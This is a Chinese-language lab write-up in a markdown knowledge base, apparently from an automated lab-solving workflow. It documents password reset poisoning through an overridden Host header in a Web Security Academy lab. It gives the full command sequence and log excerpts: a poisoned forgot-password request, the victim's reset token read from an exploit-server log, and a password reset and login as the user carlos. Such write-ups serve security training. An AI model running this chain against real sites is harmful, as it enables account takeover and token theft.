---
title: "lab-host-header-basic-password-reset-poisoning"
links:
  - target: host-header-family
    relation: evidences
---

# lab-host-header-basic-password-reset-poisoning

> evidences: [[host-header-family]]

- 题面:Basic password reset poisoning(/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-basic-password-reset-poisoning)
- 实例:https://0a4d00aa03066cd581750c6400b60062.web-security-academy.net(exploit 0afc00be03b36c72815d0bd3017e0035)
- 判定目标:毒化 carlos 的重置链接 → 取 token → 改其密码并登录;状态:**solved**(solved_check true)

## 关键步

1. `/forgot-password`(csrf + username)。**Host 覆盖在 TLS 上直接可行**(`lab_http --header 'Host: <exploit>'`,
   SNI 仍按 URL 主机)——“平台 TLS 墙”本次**未触发**。
2. 投毒:POST `/forgot-password`(`csrf`、`username=carlos`,Host=exploit server)
   → 邮件正文里的重置链接用被污染的 Host → 变成 `https://<exploit>/forgot-password?temp-forgot-password-token=…`。
   (lab 说明:carlos 会点邮件里的任何链接;邮箱客户端在 exploit server 上,读自己的邮件用它。)
3. 读 **exploit server `/log`** 拿 token(victim 点击即入日志):
   `10.0.3.108 … "GET /forgot-password?temp-forgot-password-token=ifk1c9qslzhxlkbtgzer2izuoin8b0it" 404 "user-agent: Mozilla/5.0 (Victim) … Chrome/154"`。
4. 用 token 打真站:`GET <lab>/forgot-password?temp-forgot-password-token=<token>` → 重置表单
   (`csrf` + `temp-forgot-password-token` + `new-password-1/2`)→ POST → 302 `/`(改密成功)。
5. 用新密码登录 carlos → solved。

## 证据摘录

```
lab_http post "<lab>/forgot-password" --header 'Host: exploit-0afc00be03b36c72815d0bd3017e0035.exploit-server.net' \
  --form csrf=<csrf> --form username=carlos  -> 200
lab_http get "https://exploit-…/log" -> GET /forgot-password?temp-forgot-password-token=ifk1c9qslzhxlkbtgzer2izuoin8b0it  (victim UA)
lab_http post "<lab>/login" --form csrf=<csrf> --form username=carlos --form password=hacked123 --follow
 -> 302 /my-account?id=carlos;  solved_check -> {"solved":true}
```

## 复现命令

```
lab_launch launch 16D6E2494470F17D6186FD7F07DC9C7E2220DE7CA3D8380FDC86806783644273 --widget-source /web-security/host-header/exploiting/password-reset-poisoning --jar /tmp/b24-jar5.json
lab_http get "<lab>/forgot-password" --jar /tmp/b24-jar5.json            # 取 csrf
lab_http post "<lab>/forgot-password" --jar /tmp/b24-jar5.json --header 'Host: <exploit>' --form csrf=<…> --form username=carlos
lab_http get "https://<exploit>/log" --jar /tmp/b24-jar5.json            # 读 token
lab_http get "<lab>/forgot-password?temp-forgot-password-token=<token>" --jar /tmp/b24-jar5.json --out /tmp/reset.html
lab_http post "<lab>/forgot-password?temp-forgot-password-token=<token>" --jar /tmp/b24-jar5.json \
  --form csrf=<…> --form temp-forgot-password-token=<token> --form new-password-1=hacked123 --form new-password-2=hacked123 --follow
```
